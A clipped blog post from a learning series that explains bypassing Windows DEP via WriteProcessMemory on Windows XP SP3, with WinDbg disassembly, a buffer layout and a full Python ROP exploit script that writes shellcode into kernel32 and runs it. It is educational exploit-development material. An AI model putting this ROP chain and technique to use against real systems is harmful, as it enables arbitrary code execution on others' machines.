---
title: "[Learning] Bypassing DEP: WriteProcessMemory | ISSAC/iss4cf0ng's blog"
source: https://iss4cf0ng.github.io/2026/10/02/2026-10-2-DEP/
source_host: iss4cf0ng.github.io
clip_date: 2026-10-06T15:13:52+08:00
trace_id: 7ee442eb-23d5-4695-800e-626497eec723
content_hash: 05cdd765893f479616b03273bfe2d5219491c9145a2a7aaabad394d832c40b27
status: synced
tags:
  - Windows逆向
  - 漏洞分析
series: null
feed_source: iss4cf0ng·漏洞利用学习
ai_summary: 利用 `WriteProcessMemory` 可将 shellcode 写入 `kernel32!WriteProcessMemory+0xBC`（第二次调用 `NtWriteVirtualMemory` 返回处），API 返回后 shellcode 直接被当作下一条指令执行，无需 `jmp esp` 或调整栈指针即可绕过 DEP。
ai_summary_style: key-points
images_status:
  total: 8
  succeeded: 8
  failed_urls: []
notion_page_id: 3f175244-d011-81de-b03b-d22a7eb085e9
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 利用 `WriteProcessMemory` 可将 shellcode 写入 `kernel32!WriteProcessMemory+0xBC`（第二次调用 `NtWriteVirtualMemory` 返回处），API 返回后 shellcode 直接被当作下一条指令执行，无需 `jmp esp` 或调整栈指针即可绕过 DEP。
> 
> - **API 参数用法：** `hProcess` 传 `0xFFFFFFFF` 表示当前进程；`lpBaseAddress` 为写入起始地址；`lpBuffer` 为 shellcode；`nSize` 为写入字节数；`lpNumberOfBytesWritten` 可传 `NULL`/`0`。
> - **关键偏移：** `uf kernel32!WriteProcessMemory` 反汇编显示第二次 `NtWriteVirtualMemory` 调用位于 `7c8023ea`，返回地址为 `7c8023f0`，即 `WriteProcessMemory + 0xBC`（0x7c8023f0 − 0x7c802334）。
> - **两种思路与风险：** 一是找足够大的可执行内存区写入 shellcode，但可能破坏后续使用且 ASLR 下地址不稳定；二是直接写入 API 自身空间，缺点是 shellcode 不能太大，否则会覆盖 `kernel32.dll` 其他函数导致崩溃。
> - **缓冲区布局：** `edi-…` padding A → `edi-0x10` 调用地址 → `edi-0x0c` padding B → `edi`(arg1) → `edi+0x04`(arg2=7c8023f0) → `edi+0x08`~`edi+0x10`(arg3~arg5) → `edi+0x14` padding C 触发溢出 → ROP → padding D → shellcode。
> - **动态源地址：** 第三个参数需动态生成，脚本中先压入常量作偏移，再用 `MOV EAX,EDI`、`ADD EAX,2`/`ADD EAX,-2`、`XCHG EAX,ECX` 等 gadget 结合 EDI 枢轴（示例 `0x0022FA70`）精确算出 `lpBuffer`（如 `0x138`），偏移取 140，`nSize` 为 `0x180`。

## Introduction

This article is part of my series: **[From Bug To Exploit](https://iss4cf0ng.github.io/FromBugToExploit)**.

In [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/), I mentioned six common methods to bypass DEP:

1.  `ZwSetInformationProcess`
2.  `SetProcessDEPPolicy`
3.  `VirtualProtect`
4.  `WriteProcessMemory`
5.  `VirtualAlloc & memcpy`
6.  `HeapCreate & HeapAlloc & memcpy`

In this article, I will introduce the fourth method: using the `WriteProcessMemory` API.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/23c0c19572c15f21.png)

## WriteProcessMemory

According to [the MSDN documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory), this API writes data to an area of memory in a specified process. The entire area to be written to must be accessible, or the operation fails.

There are two ways to exploit it.

The first method is to find an executable memory area that is large enough, write the shellcode into it, and execute it. However, if this area is used in the future, the application may crash. In addition, it can be very difficult to find a constant and stable memory address if ASLR is enabled. The address has to be determined dynamically.

The second method is to write the shellcode inside the `WriteProcessMemory` API itself (that is, in the memory space of the `kernel32.dll` module). It has to be written to the address of the next instruction. Therefore, it can be executed directly without using `jmp esp`. However, if we overwrite other functions inside `kernel32.dll`, the application might crash as well because their data has been corrupted. Therefore, the shellcode cannot be too large.

The definition of the API is shown below:

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

The meanings of the parameters are:

1.  We can pass `0xFFFFFFFF` (`-1`) into it, which means the current process.
2.  The starting address of the memory area that we want to write to.
3.  The payload.
4.  The size of the payload. Technically, it specifies how many bytes we want to write, so it can be smaller than the size of the payload. However, we do not write an incomplete payload while exploiting, right?
5.  This returns the number of bytes that have been written. We can set it to `NULL` or `0` since we do not use this field.

## Preparation

First, let’s disassemble the API kernel32!WriteProcessMemory in WinDbg:

```
uf kernel32!WriteProcessMemory
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5f807d9669763d81.png)

The result is shown below:

```powershell
0:000> uf kernel32!WriteProcessMemory
kernel32!WriteProcessMemory:
7c802334 8bff            mov     edi,edi
7c802336 55              push    ebp
7c802337 8bec            mov     ebp,esp
7c802339 51              push    ecx
7c80233a 51              push    ecx
7c80233b 8b450c          mov     eax,dword ptr [ebp+0Ch]
7c80233e 53              push    ebx
7c80233f 8b5d14          mov     ebx,dword ptr [ebp+14h]
7c802342 56              push    esi
7c802343 8b35c412807c    mov     esi,dword ptr [kernel32!_imp__NtProtectVirtualMemory (7c8012c4)]
7c802349 57              push    edi
7c80234a 8b7d08          mov     edi,dword ptr [ebp+8]
7c80234d 8945f8          mov     dword ptr [ebp-8],eax
7c802350 8d4514          lea     eax,[ebp+14h]
7c802353 50              push    eax
7c802354 6a40            push    40h
7c802356 8d45fc          lea     eax,[ebp-4]
7c802359 50              push    eax
7c80235a 8d45f8          lea     eax,[ebp-8]
7c80235d 50              push    eax
7c80235e 57              push    edi
7c80235f 895dfc          mov     dword ptr [ebp-4],ebx
7c802362 ffd6            call    esi
7c802364 3d4e0000c0      cmp     eax,0C000004Eh
7c802369 745c            je      kernel32!WriteProcessMemory+0x37 (7c8023c7)

kernel32!WriteProcessMemory+0x48:
7c80236b 85c0            test    eax,eax
7c80236d 7c4d            jl      kernel32!WriteProcessMemory+0xfd (7c8023bc)

kernel32!WriteProcessMemory+0x50:
7c80236f 8b4514          mov     eax,dword ptr [ebp+14h]
7c802372 a8cc            test    al,0CCh
7c802374 7464            je      kernel32!WriteProcessMemory+0x57 (7c8023da)

kernel32!WriteProcessMemory+0xbb:
7c802376 8d4d14          lea     ecx,[ebp+14h]
7c802379 51              push    ecx
7c80237a 50              push    eax
7c80237b 8d45fc          lea     eax,[ebp-4]
7c80237e 50              push    eax
7c80237f 8d45f8          lea     eax,[ebp-8]
7c802382 50              push    eax
7c802383 57              push    edi
7c802384 ffd6            call    esi
7c802386 8d4508          lea     eax,[ebp+8]
7c802389 50              push    eax
7c80238a 53              push    ebx
7c80238b ff7510          push    dword ptr [ebp+10h]
7c80238e ff750c          push    dword ptr [ebp+0Ch]
7c802391 57              push    edi
7c802392 ff150c14807c    call    dword ptr [kernel32!_imp__NtWriteVirtualMemory (7c80140c)]
7c802398 8b4d18          mov     ecx,dword ptr [ebp+18h]
7c80239b 85c9            test    ecx,ecx
7c80239d 0f859e000000    jne     kernel32!WriteProcessMemory+0xe4 (7c802441)

kernel32!WriteProcessMemory+0xe9:
7c8023a3 85c0            test    eax,eax
7c8023a5 7c15            jl      kernel32!WriteProcessMemory+0xfd (7c8023bc)

kernel32!WriteProcessMemory+0xed:
7c8023a7 53              push    ebx
7c8023a8 ff750c          push    dword ptr [ebp+0Ch]
7c8023ab 57              push    edi
7c8023ac ff15d412807c    call    dword ptr [kernel32!_imp__NtFlushInstructionCache (7c8012d4)]
7c8023b2 33c0            xor     eax,eax
7c8023b4 40              inc     eax

kernel32!WriteProcessMemory+0x105:
7c8023b5 5f              pop     edi
7c8023b6 5e              pop     esi
7c8023b7 5b              pop     ebx
7c8023b8 c9              leave
7c8023b9 c21400          ret     14h

kernel32!WriteProcessMemory+0xfd:
7c8023bc 50              push    eax
7c8023bd e877710000      call    kernel32!BaseSetLastNTError (7c809539)
7c8023c2 e984000000      jmp     kernel32!WriteProcessMemory+0x103 (7c80244b)

kernel32!WriteProcessMemory+0x37:
7c8023c7 8d4514          lea     eax,[ebp+14h]
7c8023ca 50              push    eax
7c8023cb 6a04            push    4
7c8023cd 8d45fc          lea     eax,[ebp-4]
7c8023d0 50              push    eax
7c8023d1 8d45f8          lea     eax,[ebp-8]
7c8023d4 50              push    eax
7c8023d5 57              push    edi
7c8023d6 ffd6            call    esi
7c8023d8 eb91            jmp     kernel32!WriteProcessMemory+0x48 (7c80236b)

kernel32!WriteProcessMemory+0x57:
7c8023da a803            test    al,3
7c8023dc 7540            jne     kernel32!WriteProcessMemory+0x9b (7c80241e)

kernel32!WriteProcessMemory+0x5b:
7c8023de 8d4508          lea     eax,[ebp+8]
7c8023e1 50              push    eax
7c8023e2 53              push    ebx
7c8023e3 ff7510          push    dword ptr [ebp+10h]
7c8023e6 ff750c          push    dword ptr [ebp+0Ch]
7c8023e9 57              push    edi
7c8023ea ff150c14807c    call    dword ptr [kernel32!_imp__NtWriteVirtualMemory (7c80140c)]
7c8023f0 894510          mov     dword ptr [ebp+10h],eax
7c8023f3 8b4518          mov     eax,dword ptr [ebp+18h]
7c8023f6 85c0            test    eax,eax
7c8023f8 7405            je      kernel32!WriteProcessMemory+0x7c (7c8023ff)

kernel32!WriteProcessMemory+0x77:
7c8023fa 8b4d08          mov     ecx,dword ptr [ebp+8]
7c8023fd 8908            mov     dword ptr [eax],ecx

kernel32!WriteProcessMemory+0x7c:
7c8023ff 8d4514          lea     eax,[ebp+14h]
7c802402 50              push    eax
7c802403 ff7514          push    dword ptr [ebp+14h]
7c802406 8d45fc          lea     eax,[ebp-4]
7c802409 50              push    eax
7c80240a 8d45f8          lea     eax,[ebp-8]
7c80240d 50              push    eax
7c80240e 57              push    edi
7c80240f ffd6            call    esi
7c802411 837d1000        cmp     dword ptr [ebp+10h],0
7c802415 7d90            jge     kernel32!WriteProcessMemory+0xed (7c8023a7)

kernel32!WriteProcessMemory+0x94:
7c802417 be050000c0      mov     esi,0C0000005h
7c80241c eb12            jmp     kernel32!WriteProcessMemory+0xad (7c802430)

kernel32!WriteProcessMemory+0x9b:
7c80241e 8d4d14          lea     ecx,[ebp+14h]
7c802421 51              push    ecx
7c802422 50              push    eax
7c802423 8d45fc          lea     eax,[ebp-4]
7c802426 50              push    eax
7c802427 8d45f8          lea     eax,[ebp-8]
7c80242a 50              push    eax
7c80242b 57              push    edi
7c80242c ffd6            call    esi
7c80242e 33f6            xor     esi,esi

kernel32!WriteProcessMemory+0xad:
7c802430 68050000c0      push    0C0000005h
7c802435 e8ff700000      call    kernel32!BaseSetLastNTError (7c809539)
7c80243a 8bc6            mov     eax,esi
7c80243c e974ffffff      jmp     kernel32!WriteProcessMemory+0x105 (7c8023b5)

kernel32!WriteProcessMemory+0xe4:
7c802441 8b5508          mov     edx,dword ptr [ebp+8]
7c802444 8911            mov     dword ptr [ecx],edx
7c802446 e958ffffff      jmp     kernel32!WriteProcessMemory+0xe9 (7c8023a3)

kernel32!WriteProcessMemory+0x103:
7c80244b 33c0            xor     eax,eax
7c80244d e963ffffff      jmp     kernel32!WriteProcessMemory+0x105 (7c8023b5)
```

The essential part is the second call to `NtWriteVirtualMemory` (`7c8023ea`). After the call, execution resumes at `7c8023f0`. At this point, our shellcode has already been written to the specified address.

If we pass `WriteProcessMemory + (0x7c8023f0 - 0x7c802334)` (which is `WriteProcessMemory + 0xBC`) as the destination address, our shellcode will be executed immediately after the second call to `NtWriteVirtualMemory` returns.

As a result, we do not even need to use `jmp esp` or adjust the stack pointer. However, our shellcode cannot be too large. Otherwise, it may overwrite other functions inside `kernel32.dll` and cause the application to crash.

Therefore, the layout of the exploit buffer can be organized as follows:

```sql
edi-...     : Padding A
edi-0x10    : Calling API
edi-0x0c    : Padding B
edi         : The first parameter, 0xffffffff
edi+0x04    : The second parameter, 7c8023f0
edi+0x08    : The third parameter,
edi+0x0c    : The fourth parameter,
edi+0x10    : The fifth parameter,
edi+0x14    : Padding C, causing a buffer overflow
edi+...     : ROP
edi+...     : Padding D
edi+...     : Shellcode
```

## Writing ROP Exploit Script

First, we can still pass the constant parameters into the stack directly. The only problem is the third parameter, which is the source address of the buffer. It has to be generated dynamically.

One solution is to pass a constant value into the stack and treat it as an offset. Then, we can modify it by adding the pivot (`EDI`) using ROP gadgets. With this approach, we can precisely control the source address.

Therefore, the completed implementation can be implemented as follows:

```python
# exploit.py

import struct

def p32(addr: int) -> bytes:
    return struct.pack('<I', addr)

def read_shellcode() -> bytes:
    shellcode = b''
    with open('messagebox.bin', 'rb') as f:
        shellcode = f.read()

    return shellcode

def sword_fourth() -> bytes:
    rop1 = b''
    rop1 += p32(0x7eb9a880) # PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # retn 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5b0e7) # PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08
    rop1 += b'1111' # pop esi
    rop1 += b'1111' # pop esi

    # third parameter (source buffer)
    rop2 = b''
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'22222222' # retn 0x08
    rop2 += b'2222' # pop esi
    rop2 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # retn 0x04
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # retn 0x04
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # retn 0x04
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x77c13ffd) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # retn 0x04
    rop2 += p32(0x7eba08a0) # MOV EAX,ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += p32(0x7c802f36) # ADD EAX,DWORD PTR DS:[EAX] # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += p32(0x7eb43ae2) # XCHG EAX,ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += p32(0x7eb82f36) # MOV DWORD PTR DS:[EAX],ECX # RETN

    rop3 = b''
    rop3 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333'
    rop3 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop3 += b'3333' # pop esp
    rop3 += b'3333' # pop ebp
    # 0x08 left

    shellcode = read_shellcode()

    offset = 140

    '''
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
    );
    '''

    padding_A = b'A' * 0x20
    writeprocessmemory = p32(0x7c802334) # kernel32!WriteProcessMemory
    padding_B = b'B' * 0x0c
    arg1 = p32(0xffffffff) # hProcess
    arg2 = p32(0x7c802334 + 0xbc) # lpBaseAddress
    arg3 = p32(0x138) # lpBuffer
    arg4 = p32(0x180) # nSize
    arg5 = p32(0) # *lpNumberOfBytesWritten
    padding_C = b'C' * (offset - len(padding_A) - len(writeprocessmemory) - len(padding_B) - len(arg1) - len(arg2) - len(arg3) - len(arg4) - len(arg5))

    nops = b'\x90' * 16
    
    exploit = b''
    exploit += padding_A
    exploit += writeprocessmemory
    exploit += padding_B
    exploit += arg1
    exploit += arg2
    exploit += arg3
    exploit += arg4
    exploit += arg5
    exploit += padding_C
    exploit += rop1
    exploit += rop2
    exploit += rop3
    exploit += nops
    exploit += shellcode

    return exploit

def main():
    exploit = sword_fourth()

    with open('exploit_dep.txt', 'wb') as f:
        f.write(exploit)

    print('[+] OK')

if __name__ == '__main__':
    main()
```

Now, let’s exploit it on a Windows XP SP3 virtual machine and check the status of the stack.

The pivot is `0x0022FA70`. At the beginning, the layout of the stack is shown below:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7fcc33f3a312c16d.png)

After entering the `WriteProcessMemory` API, we can see that the five pieces of data have been correctly treated as the five parameters:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4de0d919db44e871.png)

The memory layout of the stack starting at the source address `0x0022FBB0` is shown below:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/85edc818ccd98d1d.png)

Before calling `NtWriteVirtualMemory`, the memory and instructions are shown below:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/90bb309a65edb4f4.png)

After calling the API, we can see that our shellcode is located at `WriteProcessMemory + 0xBC` (`0x7c8023f0`). Therefore, it is successfully executed:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/65e366d66cf88c20.png)

## Conclusion

In this article, I introduced how to exploit a buffer overflow vulnerability with ROP based on `WriteProcessMemory`.

It is somewhat unconventional because the shellcode is executed directly after the API call.

This is the end of this article. If you have any comments or suggestions, please feel free to leave them below!

## THANKS FOR READING

I drew a [new drawing](https://www.pixiv.net/artworks/150487620) ……

Well, something bad happened in my life again. It makes me feel like my efforts mean nothing……

I wish I could regain my confidence.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0b493a86c732abe8.jpg)
